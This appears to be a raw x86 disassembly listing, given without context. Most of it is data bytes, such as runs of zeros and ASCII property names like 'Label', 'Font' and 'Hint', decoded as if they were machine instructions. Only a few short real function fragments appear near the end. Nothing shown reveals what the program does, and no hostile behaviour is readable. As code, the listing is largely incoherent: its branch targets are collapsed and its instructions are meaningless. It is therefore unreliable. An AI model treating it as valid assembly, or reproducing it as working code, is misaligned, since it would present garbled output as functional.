add [ edi + eax * 4 + 0x43 ] ch
add ah cl
xor [ eax ] eax
call 0xffffffffc442b41a
in eax dx
inc ebx
add [ esp + edx * 4 + 0x43 ] cl
add [ eax + ecx * 4 + 0x43 ] al
add ah ah
bound esp [ ebp + 0x6c ]
in al dx
jae r-xdata
add al bl
test [ ebx ] eax
xchg esp eax
xchg esi eax
inc ebx
add [ eax + edi * 2 ] ch
inc ebx
add [ eax + 0x14004378 ] ah
imul eax [ ebx ] sub_437880
push eax
fld [ edx ]
int3
add [ edx + esi * 2 + 0x722c0043 ] dh
inc ebx
add [ eax + 0x75 ] al
inc ebx
add ah ch
jae r-xdata
inc edx
add [ eax + 0x67 ] ah
inc ebx
add [ ecx + ebx * 4 + 0x41 ] bh
add [ eax - 0x6a ] dl
inc ecx
add [ eax - 0x6a ] cl
inc ecx
add [ ecx + ebx * 4 - 0x690bffbf ] al
inc edx
add ah bl
add [ ebx ] 0xd8
add [ ebx ] 0xa8
add [ ebx ] 0xffffff9c
inc bx
add al ah
insd
inc ebx
add [ ebp + ebp * 2 + 0x43 ] al
add [ esi + esi * 2 + 0x43 ] ch
add ah ah
inc ebx
add al ch
inc ebx
add ah ah
xchg ebx eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000c ] al
popad
jo r-xdata
add [ ecx + edi * 4 ] bl
inc edx
add [ eax ] ch
add [ eax ] cl
inc ebp
js r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
cwde
lodsb [ esi ]
inc ecx
add [ eax ] ch
add bh bh
dec esp
je r-xdata
imul ebp [ edi + 0x6e ] sub_41a7f8
jo r-xdata
jpe r-xdata
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add al 0x4c
add [ esp + esi * 2 + 0x43 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
clc
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
push cs
add [ edx ] cl
inc esp
jb r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor ah 0xff
insb
jae r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
je r-xdata
adc [ eax ] al
movsb [ edi ] [ esi ]
xchg edi eax
inc edx
add [ edi + edx * 4 + 0x10042 ] dh
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x65480600
imul esp [ edi + 0x68 ] 0x40103c74
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
str [ eax ]
inc esp
jb r-xdata
add [ esi * 2 + 0x43 ] dl
add [ eax - 0xfffffb ] al
or eax 0x6f430500
insb
outsd
jb r-xdata
add [ eax + 0x46040011 ] al
outsd
outsb
je r-xdata
add [ eax ] al
inc ebx
jne r-xdata
outsd
pushfd
add [ esi + ecx ] cl
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
add [ eax + 0x4297 ] ch
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c040002 ] al
push es
dec eax
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
inc ebx
add [ eax + 0x54004373 ] cl
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x259c6564
inc ebx
add [ eax + 0x73 ] bl
push ds
inc ebx
add [ edx ] bh
add bh bh
imul esp [ gs : edi + 0x68 ] 0x40103c74
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060005 ] al
jae r-xdata
add dh bh
jl r-xdata
xchg edi eax
jb r-xdata
popad
and eax 0x73580043
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000b ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9c65646f
and eax 0x9b0043
add bh bh
fwait
sub_4279ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebx + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
jpe r-xdata
fwait
add al dh
jpe r-xdata
out 0x42 eax
add [ eax + 0x67 ] ah
inc ebx
add [ edx + esi * 2 - 0x6537ffbd ] dh
inc edx
add [ eax + 0x75 ] al
inc ebx
add ah ch
jae r-xdata
inc ecx
add [ eax - 0x6a ] cl
inc ecx
add [ ecx + ebx * 4 - 0x67ebffbf ] al
inc edx
add [ ecx + 0x43 ] ch
add [ eax - 0x2bffbc1a ] cl
in eax 0x43
add [ esi - 0x2417ffbd ] bl
inc ebx
add [ eax ] cl
fadd [ ebx ]
and cl bl
inc ebx
add ah ah
inc ebx
add al ch
inc ebx
add ah ah
xchg ebp eax
inc ebx
add [ eax ] dl
xchg esi eax
inc ebx
add [ eax ] ch
loop r-xdata
0x997c0042 0x41
push eax
xchg esi eax
inc ebx
add [ edx + ebx * 4 ] dh
inc edx
add [ ecx + ebx * 4 + 0x41 ] bh
add [ eax - 0x6a ] dl
add [ edx + eax ] ch
add [ eax ] al
nop
mov ecx 0x99640042
inc ecx
add [ eax + 0x34 ] dh
inc eax
add [ edx + edx * 4 + 0x34780041 ] ah
inc eax
add [ ecx + ebp * 8 ] bh
inc edx
add ah cl
xor [ eax ] eax
call 0xffffffff9042ba22
cdq
inc ebx
add [ eax - 0x1a ] bl
inc ebx
add [ eax - 0x1bffbc52 ] al
cmp eax 0x94140041
inc ebx
add [ eax + ebx * 4 - 0x64cbffbe ] bh
movsb [ edi ] [ esi ]
xchg edx eax
inc ecx
add [ eax + 0x34 ] bh
je r-xdata
inc ebx
add [ ecx + edi * 4 ] ah
inc ebx
add [ eax ] ch
in eax dx
inc ebx
add al dl
xlat
inc ebx
add al al
fiadd [ ebx ]
or dl ah
inc edx
add [ esp + 0x42 ] al
add [ eax ] al
in al 0x42
add [ ebp - 0x1b8bffbe ] ch
inc edx
add [ esp ] ah
inc edx
add al bl
in al 0x42
add [ eax ] dl
in eax 0x42
add [ ebx ] al
add [ ebx ] cl
mov al 0xc
mov al 0x3c
mov al 0xa0
cwde
inc edx
add [ eax + 0x64004298 ] al
cwde
inc edx
add [ edx ] dl
push esp
inc ebx
jne r-xdata
add [ eax - 0x50 ] bh
inc ebx
add [ eax + esi * 4 + 0x43 ] bh
add [ edi + ebp * 4 ] dh
inc ebx
add [ eax ] bl
call 0xffffffffdb967aec
add [ ebp + esi * 4 + 0x43 ] dl
add [ esi + edx * 4 - 0x268bffbd ] dl
inc ebx
add [ eax ] dh
fiadd [ ebx ]
in al dx
cwde
inc edx
add [ edx + ebx * 8 ] dl
inc ebx
add [ ebx + ebx * 4 - 0x5dbfffbd ] ch
inc ebx
add al ah
scasd [ edi ]
inc ebx
add [ eax - 0x1a ] cl
inc edx
add [ edi ] al
inc edx
add [ edi + 0x42 ] dh
out 0x42 eax
add [ eax + 0x67 ] ah
inc ebx
add [ edx + esi * 2 - 0x6537ffbd ] dh
inc edx
add [ eax + 0x75 ] al
inc ebx
add ah ch
jae r-xdata
inc eax
add [ ecx + ebp * 8 ] bh
inc edx
add ah cl
xor [ eax ] eax
call 0xffffffff9042bbae
cdq
inc ebx
add [ eax - 0x1a ] bl
inc ebx
inc eax
add [ edx + edx * 4 + 0x34780041 ] ah
insd
dec esp
popad
bound esp [ ebp + 0x6c ]
inc ebp
imul esi [ fs : eax + edx * 4 + 0x8 ] 0x700427b
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
add [ edx + 0x1 ] ah
inc ebx
je r-xdata
inc ebx
add [ ecx + edi * 4 ] ah
inc ebx
add [ eax ] ch
in eax dx
inc ebx
add al dl
xlat
inc ebx
add al al
fiadd [ ebx ]
or dl ah
inc edx
add [ esp + 0x42 ] al
add [ eax ] al
in al 0x42
add [ ebp - 0x1b8bffbe ] ch
inc edx
add [ esp ] ah
inc edx
add al bl
in al 0x42
add [ eax ] dl
in eax 0x42
add [ esp + edx * 2 ] cl
dec esp
popad
bound esp [ ebp + 0x6c ]
inc ebp
imul esi [ fs : ebp + ecx * 4 + 0x40 ] 0x427c7c00
add [ edi ] al
or al 0x54
dec esp
popad
bound esp [ ebp + 0x6c ]
inc ebp
imul esi [ fs : eax + eax * 4 + 0x7b ] 0x7b040042
inc edx
add [ eax + eax + 0x8 ] al
inc ebp
js r-xdata
add [ eax - 0x50 ] bh
inc ebx
add [ eax + esi * 4 + 0x43 ] bh
add [ edi + ebp * 4 ] dh
inc ebx
add [ eax ] bl
call 0xffffffffdb967c78
add [ ebp + esi * 4 + 0x43 ] dl
add [ esi + edx * 4 - 0x268bffbd ] dl
inc ebx
add [ eax ] dh
fiadd [ ebx ]
in al dx
cwde
inc edx
add [ edx + ebx * 8 ] dl
inc ebx
add [ ebx + ebx * 4 - 0x5dbfffbd ] ch
inc ebx
add al ah
scasd [ edi ]
inc ebx
add [ eax - 0x1a ] cl
inc edx
add [ edi ] al
inc edx
add [ edi + 0x42 ] dh
add [ eax - 0x1bffbc52 ] al
cmp eax 0x94140041
inc ebx
add [ eax + ebx * 4 - 0x64cbffbe ] bh
inc ebx
add [ edx + ebx * 4 ] dh
inc edx
add [ ecx + ebx * 4 + 0x41 ] bh
outsd
insd
dec esp
popad
bound esp [ ebp + 0x6c ]
inc ebp
imul esi [ fs : esp + esi * 8 + 0x79 ] 0xbb040042
inc edx
add [ eax + eax ] cl
or [ ebp + 0x78 ] al
je r-xdata
add [ eax ] al
adc al [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
inc ebp
jae r-xdata
add bh bh
cwde
call sub_437d5a
add [ eax ] al
add [ eax ] al
add [ eax + 0xf ] al
str [ edx ]
inc edx
jbe r-xdata
bound eax [ ecx ]
insb
jae r-xdata
je r-xdata
add [ eax ] al
adc eax 0x68430800
popad
jb r-xdata
insb
dec edi
jne r-xdata
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
xor al 0x43
add [ ebx + 0x1 ] ah
add [ eax ] al
or eax 0x75410a00
je r-xdata
add ah dh
and eax 0x610043
add bh bh
lodsb [ esi ]
inc bx
add [ eax + 0x67 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
add [ eax - 0x6a ] dl
inc ecx
add [ eax - 0x6a ] cl
inc ecx
add [ ecx + ebx * 4 - 0x67ebffbf ] al
inc edx
add [ ecx + 0x43 ] ch
add [ eax - 0x2bffbc1a ] cl
in eax 0x43
add [ esi - 0x2417ffbd ] bl
inc ebx
add [ eax ] cl
fadd [ ebx ]
and cl bl
inc ebx
add ah ah
inc ebx
add al ch
inc ebx
add ah ah
xchg ebp eax
inc ebx
add [ eax ] dl
xchg esi eax
inc ebx
add [ eax ] ch
loop r-xdata
insb
jae r-xdata
jb r-xdata
popad
jae r-xdata
add bh bh
clc
je r-xdata
jb r-xdata
add bh bh
push esp
call sub_437d7f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax + 0x42080013 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8c65646f
retn
insb
dec ecx
outsb
outsb
jb r-xdata
push ebx
insb
arpl [ gs : eax + eax + 0x10 ] si
inc eax
add [ edi ] cl
add al [ eax ]
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
add [ ebp + 0x7b800040 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 2 + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7c ] ch
inc edx
add [ eax ] dh
add al [ eax ]
add [ eax + 0x64004279 ] ch
cdq
inc ecx
add [ eax + 0x34 ] dh
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x7f00ffff ] ah
fadd [ ebx ]
movsb [ edi ] [ esi ]
fadd [ ebx ]
add [ eax ] al
inc esp
mov ah 0x1e
clc
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax ] dh
add [ eax - 0x80000000 ] al
sbb [ eax ] al
add eax 0x336c7443
sbb ah 0x43
add [ esp + ebx * 8 + 0x43 ] ah
add [ esi * 2 + 0x43 ] dl
add [ eax - 0xfffffb ] al
je r-xdata
push cs
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
call sub_437dc8
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
xor eax 0x1650043
add bh bh
enter 0x43e8 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x65 ] eax
jbe r-xdata
xor al 0x43
add [ ecx + eax ] ah
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add bh bh
cmp al 0xe2
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc ebx
add [ eax + eax ] dh
[ eax + ebx * 4 ]
loop r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add dh bh
jl r-xdata
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
call [ eax + ebp * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
add [ fs : eax ] eax
add [ eax ] al
jae r-xdata
or eax [ ebx + 0x6f ]
jb r-xdata
outsb
jae r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push ss
add [ 0x6f6c6f43 ] al
jb r-xdata
add bh bh
inc ebx
push eax
jb r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
xchg esp eax
outsd
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ebx ] cl
inc ebx
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4509001c ] al
imul esi [ fs : esp + ecx * 2 + 0x61 ] 0x6c6562
adc [ eax ] al
and eax 0x9b0043
add bh bh
fwait
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cwde
lodsb [ esi ]
inc ecx
add [ eax ] ch
add bh bh
dec esp
je r-xdata
add [ eax ] ah
add al [ eax ]
inc [ eax ]
add [ eax ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
insb
inc esp
mov ecx 0x2130042
add bh bh
pushad
inc [ ecx + eax + 0x1ff00 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
and [ eax ] al
pop es
dec ecx
insd
dec ebp
outsd
pop esp
xor al 0x43
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49070021 ] al
insd
dec esi
popad
insd
pop esp
jns r-xdata
add [ esp + esi * 2 + 0x43 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001e ] al
outsd
outsb
je r-xdata
je r-xdata
xchg esp eax
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
xor eax [ esp + esi * 4 + 0x1e ]
bound esp [ ebp + 0x6c ]
push ebx
jo r-xdata
add [ edx + eax ] ah
add bh bh
adc al 0x99
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al [ eax ]
or eax 0x6562614c
insb
push eax
outsd
jae r-xdata
adc [ eax ] al
adc [ edx ] eax
add bh bh
je r-xdata
add [ eax ] eax
arpl [ ecx + 0x6e ] bp
cmp al 0x10
inc eax
add [ eax ] cl
add al [ eax ]
dec [ eax + 0x10042e2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al 0x0
or [ ebp + 0x61 ] ecx
js r-xdata
or cl [ edi + 0x45 ]
je r-xdata
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ 0x65646948 ] cl
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
int3
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
outsb
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
[ esi * 2 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
daa
add [ ebx ] cl
push eax
popad
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
jb r-xdata
dec ebp
inc ebx
outsd
outsb
jbe r-xdata
inc ebp
outsd
outsb
cmp al 0x10
inc eax
add [ eax ] ch
add al [ eax ]
jmp [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009002c ] al
outsd
jo r-xdata
outsb
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] ch
add [ ebx ] cl
push eax
popad
add [ ecx ] 0x0
add [ eax ] al
sub al [ eax ]
outsb
je r-xdata
jb r-xdata
or edx [ eax + 0x61 ]
add [ eax ] dl
inc eax
add [ edx ] dl
add al [ eax ]
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
sub [ eax ] eax
or dl [ eax + 0x61 ]
inc esp
add [ eax ] dl
add [ eax ] al
add [ es : esi ] cl
push eax
popad
jb r-xdata
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
push [ ebp + ebx * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
jo r-xdata
or al 0x50
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
jb r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
and eax 0xdcdc0043
ja r-xdata
push cs
push eax
popad
jb r-xdata
je r-xdata
add [ eax ] al
and eax 0x73580043
inc ebx
add [ eax + 0x1004373 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040030 ] al
js r-xdata
inc ebx
fcomp st4
outsb
jne r-xdata
adc [ eax ] al
0xccff0000 0x4374
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
cdq
adc [ eax ] al
push cs
push 0x6948776f
outsb
je r-xdata
sub [ eax ] al
or edx [ eax + 0x61 ]
adc [ eax ] al
test eax 0xb0ff0001
fadd [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
je r-xdata
jb r-xdata
popad
jae r-xdata
inc eax
add [ ecx ] bl
add bh bh
test [ ebx + eax * 2 ] dh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
xor eax [ eax + eax + 0x10 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0034 ] al
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
js r-xdata
add [ ebp + ebx * 8 + 0x43 ] bl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
sub eax 0x65520800
popad
dec edi
outsb
insb
jns r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc esp
add [ eax + eax ] bh
call [ eax ]
jae r-xdata
adc [ eax ] al
or eax 0x3cff0002
jecxz r-xdata
sub eax [ eax ]
add [ eax ] al
add [ eax ] cl
push ebx
push 0x6948776f
outsb
inc ebx
push 0x64387261
add [ eax ] al
js r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
xor [ eax + eax ] 0xe
dec edi
inc ebx
add ah dl
xchg ebx eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x54656c62
cmovno eax [ eax ]
sbb [ edx ] al
add bh bh
sbb [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
push esp
cmovno eax [ eax ]
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
hlt
[ eax + 0x70004374 ]
add [ ecx ] al
add [ eax ] al
add al [ eax ]
inc esp
jecxz r-xdata
inc eax
add [ esi ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
dec edi
jbe r-xdata
in al dx
push eax
outsd
jo r-xdata
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
dec ebx
jns r-xdata
add [ eax + 0x4f07003a ] al
push esp
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x14 ] bp
sub [ ebx ] eax
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or [ edi + 0x6e ] ecx
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090038 ] al
outsb
jo r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ ebx ] cl
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0a00
cmovno eax [ eax ]
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax [ eax ]
push es
dec edi
outsb
inc ebp
js r-xdata
outsb
inc esp
jb r-xdata
add [ eax - 0x80000000 ] al
aaa
add [ edx ] cl
dec edi
sub [ ebx ] eax
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] al
or [ edi + 0x6e ] ecx
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax + 0x4f0a0037 ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
cmovno eax [ eax ]
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0a00
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe94182b8
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0036 ] al
outsb
inc esp
jb r-xdata
popad
dec ebp
outsd
jbe r-xdata
dec edi
outsb
dec ebp
outsd
jne r-xdata
jae r-xdata
jns r-xdata
je r-xdata
loopne r-xdata
jo r-xdata
daa
sub [ eax ] 0x43
add al ah
add [ eax ] eax
jmp eax
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090039 ] al
outsb
inc esp
jb r-xdata
dec edi
outsb
push ebx
je r-xdata
pop eax
daa
inc ebx
add al ah
add [ eax ] al
jmp eax
xor al 0x28
inc ebx
add al ch
add [ eax ] eax
dec ebx
jns r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003d ] al
outsb
sub [ ebx ] al
fadd [ ecx ]
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or [ edi + 0x6e ] ecx
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ecx
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090041 ] al
daa
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
cmovno eax [ eax ]
rol [ ecx ] 0x0
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
in al dx
jb r-xdata
hlt
push ebp
jo r-xdata
arpl [ ebx - 0x5c ] bp
sub [ ebx ] eax
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebx
add [ ebx ] cl
inc esp
outsd
ja r-xdata
[ eax ]
sub [ ebx ] al
[ eax ] al
push eax
add [ eax ] al
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41ceac
pop ebx
mov esp ebp
pop ebp
retn
inc ebp
or [ ebx + 0x458b0c50 ] cl
or [ ebx + 0x408bf840 ] cl
adc al ch
test [ ecx - 0x1 ] 0xff
inc esp
jb r-xdata
dec ebp
outsd
jne r-xdata
sub eax [ ebx ]
add [ ecx ] al
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
inc ebx
add al bl
add [ eax ] al
shl [ edi ] 0x1
inc ebp
or [ ebx + 0x2b9f840 ] cl
add [ eax ] al
add al ch
xchg edx eax
dec ecx
nop
inc eax
inc edx
jb r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41ceac
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41c724
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
inc esp
outsd
sub_427f67
xor eax [ ebx ]
test [ ecx ] al
add bh bh
test [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
and [ eax ] al
pop es
dec ecx
insd
dec ebp
outsd
pop esp
xor al 0x43
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49070021 ] al
insd
dec esi
popad
insd
pop esp
jns r-xdata
bound esp [ ebp + 0x6c ]
push ebx
jo r-xdata
add [ edx + eax ] ah
add bh bh
adc al 0x99
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
